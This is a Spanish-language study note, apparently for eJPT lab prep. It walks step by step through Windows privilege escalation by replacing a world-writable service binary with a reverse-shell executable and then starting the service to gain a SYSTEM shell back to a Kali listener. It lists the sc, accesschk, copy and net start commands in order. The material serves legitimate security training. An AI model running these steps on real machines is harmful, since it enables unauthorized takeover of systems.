- Consulta el "filepermsvc" servicio y noque se ejecuta con privilegios SYSTEM (SERVICE_START_NAME).

```
sc qc filepermsvc
```

- Usando accesschk.exe, tenga en cuenta que el archivo binario de servicio (BINARY_PATH_NAME) es escribible por todos:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

- Copie el ejecutable reverse.exe que creó y reemplace el filepermservice.exe con él:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

```
- Inicie un oyente en Kali y luego comience el servicio para generar una carcasa inversa que funcione con privilegios de SISTEMA:

```
net start filepermsvc
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Service Exploits - Insecure Service Permissions]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Service Exploits - Unquoted Service Path]] 
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Service Exploits - Weak Registry Permissions]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]